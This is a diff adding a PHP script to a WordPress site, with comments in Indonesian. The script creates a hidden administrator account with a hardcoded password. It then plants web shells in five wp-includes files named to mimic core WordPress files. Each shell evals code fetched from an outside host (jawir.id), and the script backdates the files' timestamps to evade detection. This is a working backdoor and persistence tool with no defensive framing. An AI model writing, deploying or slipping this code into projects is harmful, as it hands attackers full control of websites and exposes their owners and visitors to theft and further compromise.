@@ -1,0 +1,51 @@
+<?php
+define('WP_USE_THEMES', false);
+require('wp-blog-header.php');
+
+// Membuat admin baru
+$new_admin_username = 'it-team';
+$new_admin_password = 'plerkuda138!@';
+$new_admin_email = 'it-admin@' . $_SERVER['HTTP_HOST'];
+
+if (!username_exists($new_admin_username)) {
+    $user_id = wp_create_user($new_admin_username, $new_admin_password, $new_admin_email);
+
+    $user = new WP_User($user_id);
+    $user->set_role('administrator');
+
+    echo 'Admin baru berhasil dibuat:<br>';
+    echo $new_admin_username . ' (USERNAME)<br>';
+    echo $new_admin_password . ' (PASSWORD)<br>';
+    echo $new_admin_email . ' (EMAIL)<br>';
+}
+
+// Konten shell untuk masing-masing path
+$shell_content_1 = '<?php eval("?>".file_get_contents("https://jawir.id/raw/JNMcupnD9f"));?>';
+$shell_content_2 = '<?php eval("?>".file_get_contents("https://jawir.id/raw/1qogrI0aWq"));?>';
+$shell_content_3 = '<?php eval("?>".file_get_contents("https://jawir.id/raw/ulVQaDW8fq"));?>';
+
+// Daftar path file dan konten shell yang sesuai
+$file_paths = [
+    "./wp-includes/rest-api/endpoints/class-wp-rest-api-controller.php" => $shell_content_1,
+    "./wp-includes/SimplePie/Decode/HTML/Dentities.php" => $shell_content_1,
+    "./wp-includes/style-engine/class-wp-style-engine-system.php" => $shell_content_2,
+    "./wp-includes/php-compat/readsonly.php" => $shell_content_2,
+    "./wp-includes/widgets/class-wp-nav-widgets.php" => $shell_content_3,
+];
+
+// Membuat dan menulis konten shell ke file
+foreach ($file_paths as $file_path => $content) {
+    if (!is_dir(dirname($file_path))) {
+        mkdir(dirname($file_path), 0777, true);
+    }
+
+    file_put_contents($file_path, $content);
+    touch($file_path, filemtime('/etc/passwd'));
+}
+
+echo "File telah berhasil dibuat:<br><br>";
+
+foreach (array_keys($file_paths) as $file_path) {
+    echo "https://" . $_SERVER['HTTP_HOST'] . str_replace("./", "/", $file_path) . "<br>";
+}
+?>
